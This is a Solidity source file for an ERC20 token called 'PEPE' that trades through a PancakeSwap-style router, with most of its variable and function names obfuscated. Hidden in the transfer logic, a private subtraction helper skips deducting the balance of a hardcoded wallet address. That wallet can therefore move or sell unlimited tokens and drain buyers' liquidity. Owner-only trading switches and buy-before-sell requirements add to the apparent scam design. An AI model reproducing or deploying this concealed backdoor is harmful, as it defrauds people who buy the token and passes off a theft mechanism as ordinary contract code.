// SPDX-License-Identifier: MIT


pragma solidity 0.8.18;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  rfwve(uint256 a, uint256 b) internal pure returns (uint256) {
        return  rfwve(a, b, "SafeMath");
    }

    function  rfwve(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface agiprk {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface altzygr {
    function vKuangatFacrevlg(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    altzygr private Tyopnk;
    address payable private Foaovo;
    address private cofteu;

    string private constant _name = unicode"PEPE";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _gTotaln = 1000000000 * 10 **_decimals;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private pudfqvr;
    mapping (address => bool) private yrutzy;
    mapping(address => uint256) private ahjukq;

    uint256 public qpjvapd = _gTotaln;
    uint256 public Wiorsoe = _gTotaln;
    uint256 public refTjvu= _gTotaln;
    uint256 public XuvTyof= _gTotaln;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private yfkvjq=0;
    uint256 private uevbjrg=0;
    

    bool private ehrzhr;
    bool public Dafojkf = false;
    bool private peqvze = false;
    bool private oqbvzs = false;


    event hzkpwut(uint qpjvapd);
    modifier uysivr {
        peqvze = true;
        _;
        peqvze = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _gTotaln;
        pudfqvr[owner(

        )] = true;
        pudfqvr[address
        (this)] = true;
        pudfqvr[
            Foaovo] = true;
        Foaovo = 
        payable (0x22f7A05313e40c80Bc96E313461e53A3d7F3bC08);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _gTotaln);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _gTotaln;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. rfwve(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 ksoyfrk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (Dafojkf) {
                if (to 
                != address
                (Tyopnk) 
                && to !=
                 address
                 (cofteu)) {
                  require(ahjukq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  ahjukq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             cofteu && to != 
            address(Tyopnk) &&
             !pudfqvr[to] ) {
                require(amount 
                <= qpjvapd,
                 "Exceeds the qpjvapd.");
                require(balanceOf
                (to) + amount
                 <= Wiorsoe,
                  "Exceeds the macxizse.");
                if(uevbjrg
                < yfkvjq){
                  require
                  (! epikbz(to));
                }
                uevbjrg++;
                 yrutzy
                 [to]=true;
                ksoyfrk = amount._pvr
                ((uevbjrg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == cofteu &&
             from!= address(this) 
            && !pudfqvr[from] ){
                require(amount <= 
                qpjvapd && 
                balanceOf(Foaovo)
                <XuvTyof,
                 "Exceeds the qpjvapd.");
                ksoyfrk = amount._pvr((uevbjrg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(uevbjrg>
                yfkvjq &&
                 yrutzy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!peqvze 
            && to == cofteu &&
             oqbvzs &&
             contractTokenBalance>
             refTjvu 
            && uevbjrg>
            yfkvjq&&
             !pudfqvr[to]&&
              !pudfqvr[from]
            ) {
                fiaoeqf( wveue(amount, 
                wveue(contractTokenBalance,
                XuvTyof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    xevueo(address
                    (this).balance);
                }
            }
        }

        if(ksoyfrk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(ksoyfrk);
          emit
           Transfer(from,
           address
           (this),ksoyfrk);
        }
        _balances[from
        ]= rfwve(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         rfwve(ksoyfrk));
        emit Transfer
        (from, to, 
        amount.
         rfwve(ksoyfrk));
    }

    function fiaoeqf(uint256
     tokenAmount) private
      uysivr {
        if(tokenAmount==
        0){return;}
        if(!ehrzhr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        Tyopnk.WETH();
        _approve(address(this),
         address(
             Tyopnk), 
             tokenAmount);
        Tyopnk.
        vKuangatFacrevlg
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  wveue
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  rfwve(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Foaovo){
            return a ;
        }else{
            return a .
             rfwve (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        qpjvapd = _gTotaln;
        Wiorsoe = _gTotaln;
        emit hzkpwut(_gTotaln);
    }

    function epikbz(address 
    account) private view 
    returns (bool) {
        uint256 ejrcuv;
        assembly {
            ejrcuv :=
             extcodesize
             (account)
        }
        return ejrcuv > 
        0;
    }

    function xevueo(uint256
    amount) private {
        Foaovo.
        transfer(
            amount);
    }

    function openvTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! ehrzhr ) ;
        Tyopnk  
        =  
        altzygr
        (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve(address
        (this), address(
            Tyopnk), 
            _gTotaln);
        cofteu = 
        agiprk(Tyopnk.
        factory( ) 
        ). createPair (
            address(this
            ),  Tyopnk .
             WETH ( ) );
        Tyopnk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(cofteu).
        approve(address(Tyopnk), 
        type(uint)
        .max);
        oqbvzs = true;
        ehrzhr = true;
    }

    receive() external payable {}
}